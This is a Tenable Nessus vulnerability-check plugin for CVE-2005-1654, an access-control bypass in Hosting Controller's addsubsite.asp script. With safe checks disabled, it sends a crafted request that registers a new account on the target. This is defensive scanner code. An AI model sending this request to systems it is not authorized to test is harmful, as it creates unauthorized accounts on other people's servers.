#
# (C) Tenable Network Security
#



  desc["english"] = "
Synopsis :

The remote web server contains an ASP script that is susceptible
to unauthorized access. 

Description :

The version of Hosting Controller installed on the remote host does
not properly validate access to administrative scripts.  An attacker
can exploit this flaw to register accounts simply by passing arguments
to the 'addsubsite.asp' script. 

See also : 

http://isun.shabgard.org/hc3.txt

Solution : 

Apply hotfix 2.0 or later to version 6.1.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:N/A:N/I:P/B:N)";


if (description) {
  script_id(18363);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-1654");
  script_bugtraq_id(13531);

  name["english"] = "Hosting Controller addsubsite.asp Security Bypass";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for addsubsite.asp security bypass in Hosting Controller";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8077);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:8077);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Specify the exploit to use.
exploit = "/hosting/addsubsite.asp";
if (!safe_checks()) {
  user = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789", length:6);
  pass = rand_str();
  exploit = string(
    exploit, "?",
    "loginname=", user, "&",
    "password=", pass, "&",
    # nb: just to identify ourselves in the logs.
    "address=", SCRIPT_NAME
  );
}


# Check various directories for Hosting Controller.
foreach dir (cgi_dirs()) {
  # Try the exploit.
  req = http_get(item:dir +  exploit, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  if (safe_checks()) {
    # The add fails without a loginname.
    if ('<a HREF="addresult.asp?Result=9&amp;Addresult' >< res) {
      security_note(port);
      exit(0);
    }
  }
  else {
    # If the add worked, there's a redirect with the username and password.
    if (string("Location: AddResult.asp?Result=0&User=", user, "&Pass=", pass) >< res) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus has successfully exploited this vulnerability by registering\n",
        "the following account to Host Controller on the remote host:\n",
        "         ", user, "\n",
        "You are encouraged to delete this account as soon as possible.\n"
      );
      security_note(port:port, data:report);
      exit(0);
    }
  }
}
